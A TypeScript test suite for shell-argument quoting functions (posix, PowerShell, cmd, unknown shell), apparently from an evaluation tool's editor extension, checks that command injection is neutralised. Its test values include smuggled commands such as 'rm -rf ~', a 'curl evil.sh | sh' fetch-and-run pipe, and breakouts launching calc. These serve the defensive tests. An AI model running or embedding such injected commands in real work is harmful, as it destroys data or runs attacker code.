import * as assert from "assert";
import * as os from "os";

import {
  detectShellKind,
  quoteArg,
  quoteArgUnknownShell,
  quoteCommandLine,
  quoteCommandLineUnknownShell,
  shellKindFromPath,
} from "../../core/shell-quote";

suite("Shell Quote Test Suite", () => {
  suite("detectShellKind", () => {
    test("recognizes posix shells by path", () => {
      assert.strictEqual(detectShellKind("/bin/bash"), "posix");
      assert.strictEqual(detectShellKind("/usr/bin/zsh"), "posix");
      assert.strictEqual(detectShellKind("/bin/sh"), "posix");
      assert.strictEqual(detectShellKind("/usr/local/bin/fish"), "posix");
    });

    test("recognizes git-bash on Windows as posix", () => {
      assert.strictEqual(
        detectShellKind("C:\\Program Files\\Git\\bin\\bash.exe"),
        "posix"
      );
    });

    test("recognizes powershell", () => {
      assert.strictEqual(detectShellKind("pwsh"), "powershell");
      assert.strictEqual(
        detectShellKind(
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ),
        "powershell"
      );
    });

    test("recognizes cmd", () => {
      assert.strictEqual(
        detectShellKind("C:\\Windows\\System32\\cmd.exe"),
        "cmd"
      );
    });

    test("falls back to the platform default when the shell is unknown", () => {
      // An unknown/undefined shell falls back to the platform default:
      // powershell on Windows, posix elsewhere.
      const expected = os.platform() === "win32" ? "powershell" : "posix";
      assert.strictEqual(detectShellKind(undefined), expected);
      assert.strictEqual(detectShellKind("/some/unknown/shell"), expected);
    });
  });

  suite("quoteArg - posix", () => {
    test("returns safe tokens unchanged", () => {
      assert.strictEqual(quoteArg("inspect", "posix"), "inspect");
      assert.strictEqual(
        quoteArg("task.py@my_task", "posix"),
        "task.py@my_task"
      );
      assert.strictEqual(quoteArg("--limit=10", "posix"), "--limit=10");
    });

    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "posix"), "'my task'");
    });

    test("escapes embedded single quotes", () => {
      assert.strictEqual(quoteArg("it's", "posix"), "'it'\\''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm -rf ~", "posix"),
        "'task; rm -rf ~'"
      );
    });
  });

  suite("quoteArg - powershell", () => {
    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "powershell"), "'my task'");
    });

    test("escapes embedded single quotes by doubling", () => {
      assert.strictEqual(quoteArg("it's", "powershell"), "'it''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm $env:HOME", "powershell"),
        "'task; rm $env:HOME'"
      );
    });

    test("quotes a comma so PowerShell does not split it into an array", () => {
      // In PowerShell argument mode 'a,b' is the array operator; quoting keeps
      // it a single literal argument.
      assert.strictEqual(
        quoteArg("tasks.py@demo,--model-base-url,https://x", "powershell"),
        "'tasks.py@demo,--model-base-url,https://x'"
      );
      assert.strictEqual(quoteArg("1,2", "powershell"), "'1,2'");
    });

    test("doubles Unicode smart quotes so they cannot terminate the string", () => {
      // PowerShell treats U+2018–U+201B as single-quote characters, so an
      // embedded smart quote must be doubled or it would end the quoted string
      // and let the following text execute.
      const payload = "demo" + "’" + ";calc;" + "’";
      const quoted = quoteArg(payload, "powershell");
      assert.strictEqual(quoted, "'demo’’;calc;’’'");
    });

    test("quotes a leading @ (splatting/array subexpression)", () => {
      assert.strictEqual(quoteArg("@evil", "powershell"), "'@evil'");
    });

    test("still passes a comma unquoted to POSIX and cmd", () => {
      assert.strictEqual(quoteArg("1,2", "posix"), "1,2");
      assert.strictEqual(quoteArg("1,2", "cmd"), "1,2");
    });
  });

  suite("quoteArg - cmd", () => {
    test("double-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "cmd"), '"my task"');
    });

    test("caret-escapes cmd metacharacters", () => {
      assert.strictEqual(quoteArg("a&b|c", "cmd"), '"a^&b^|c"');
    });

    test("escapes embedded double quotes", () => {
      assert.strictEqual(quoteArg('say "hi"', "cmd"), '"say ""hi"""');
    });
  });

  suite("quoteCommandLine", () => {
    test("leaves safe tokens bare and only quotes what needs it", () => {
      // "inspect" and "eval" are safe; "my task.py@t" has a space and needs quoting.
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "my task.py@t"], "posix"),
        "inspect eval 'my task.py@t'"
      );
    });

    test("quotes a hostile target as a single literal token", () => {
      const hostile = "task.py; curl evil.sh | sh";
      const line = quoteCommandLine(["inspect", "eval", hostile], "posix");
      assert.strictEqual(line, `inspect eval '${hostile}'`);
    });

    test("safe tokens are bare across all shell kinds", () => {
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "powershell"),
        "inspect eval task.py@my_task"
      );
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "cmd"),
        "inspect eval task.py@my_task"
      );
    });
  });

  suite("shellKindFromPath", () => {
    test("returns undefined when the shell can't be identified", () => {
      assert.strictEqual(shellKindFromPath(undefined), undefined);
      assert.strictEqual(shellKindFromPath(""), undefined);
      assert.strictEqual(
        shellKindFromPath("C:\\some\\custom-shell.exe"),
        undefined
      );
    });

    test("positively identifies known shells", () => {
      assert.strictEqual(shellKindFromPath("/bin/bash"), "posix");
      assert.strictEqual(shellKindFromPath("cmd.exe"), "cmd");
      assert.strictEqual(shellKindFromPath("pwsh"), "powershell");
    });
  });

  suite("unknown-shell quoting", () => {
    test("double-quotes so `&` is inert in both cmd.exe and PowerShell", () => {
      // The exploited case: a task file named `x & calc & y.py`. Double quotes
      // render `&` literal in both shells, so nothing executes.
      assert.strictEqual(
        quoteArgUnknownShell("x & calc & y.py"),
        '"x & calc & y.py"'
      );
    });

    test("refuses tokens neither shell can quote safely", () => {
      // $/backtick (PowerShell expansion), %/! (cmd expansion), embedded quote.
      assert.strictEqual(quoteArgUnknownShell("a$b"), null);
      assert.strictEqual(quoteArgUnknownShell("a`b"), null);
      assert.strictEqual(quoteArgUnknownShell("%PATH%"), null);
      assert.strictEqual(quoteArgUnknownShell('a"b'), null);
    });

    test("leaves safe tokens bare so the command stays executable", () => {
      // Safe tokens (incl. the leading command) must stay bare — a quoted
      // leading token is a string literal, not a command, in PowerShell.
      assert.strictEqual(
        quoteCommandLineUnknownShell(["python", "eval", "ok.py"]),
        "python eval ok.py"
      );
    });

    test("leaves safe tokens bare and double-quotes unsafe ones", () => {
      assert.strictEqual(
        quoteCommandLineUnknownShell(["inspect", "eval", "x & y.py"]),
        'inspect eval "x & y.py"'
      );
    });

    test("command line is null if any token can't be quoted safely", () => {
      assert.strictEqual(
        quoteCommandLineUnknownShell(["python", "$(evil)"]),
        null
      );
    });
  });
});
